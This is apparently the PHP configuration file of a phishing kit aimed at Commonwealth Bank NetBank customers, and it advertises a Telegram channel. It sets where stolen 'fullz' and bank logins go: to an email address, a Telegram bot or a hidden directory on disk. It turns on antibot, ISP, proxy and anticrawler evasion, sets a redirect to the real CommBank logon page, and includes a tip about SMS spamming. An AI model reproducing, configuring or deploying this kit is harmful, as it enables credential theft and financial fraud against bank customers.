﻿<?php

/*

--------------------------------
VERSION 3.1
MOBILE ONLY CONTROLS
----------------------------

VERSION 1.3
SAVE LOGS
----------------------------



Channel @itsurjoker On TELEGRAM

PAGES V3

MAJOR ANTIBOT UPGRADES
PROXY BLOCK ADDITION
TELEGRAM CHANNEL RESULTS
MORE ANTICRAWLER TRAPS AND TEST

------------------------------------
------------------------------------
*/

$PAGENAME="";
// 1 IS ON or 0 IS OFF

$EMAIL= ""; // EMAIL RESULT WOULD BE SENT TO
$OWNER ="J"; // THIS NAME WILL SHOW UP IN THE RESULTS AS FULLZ OWNER


$BANKLOG=1; // DISABLE OR ENABLE BANK LOGS | NO BANK
$SAVEBINDIRECTORY=""; // USE A RANDOM NAME NO ONE CAN GUESS FULLZ WILL BE SAVED HERE





// ---------- ANTIBOT / PROXY CONTROLS -----------
$BLACKTDS=0;
$ISPBLOCK=0; 
$STATICANTIBOT=0; 
$M3DBLOCK=0; 
$M3DBLOCKHOST=0; 
$M3DPENALTY=0;
$ONETIMEACCESS=0;
// ---------- ANTIBOT / PROXY CONTROLS -----------







$REDIRECT="https://www.my.commbank.com.au/netbank/Logon/Logon.aspx?ei=mv_logon-NB"; 
$TIMEOUT="3000";

// ---------- DEVICE CONTROL -----------

$MOBILE_ALLOWED=1;
$DESKTOP_ALLOWED=1; // IF SPAMMING SMS TURN DESKTOP OFF! COULD HELP PAGE LAST LONGER!

//---------------------------------------

//------------ TELEGRAM CONTROLS -------------
$TELEGRAM=0; // IF YOU NEED RESULTS SENT TO YOUR TG ACCOUNT CONTACT US @itsurjoker on TG  ADD YOUR BOT TO CHANNEL, MAKE IT ADMIN, INPUT CREDENTIALS HERE.
$TELEGRAMCHANNELID="";
$TELEGRAMBOTTOKEN="";
//-----------------------------------


//------------ SAVE TO DISK ---------
$SAVELOG=0;

/* M3DULAR DEBUG LINE*/
$DEBUG=1; 

if($_SERVER['REMOTE_ADDR']=="::1"){$BLACKTDSDEBUG=1;}




?>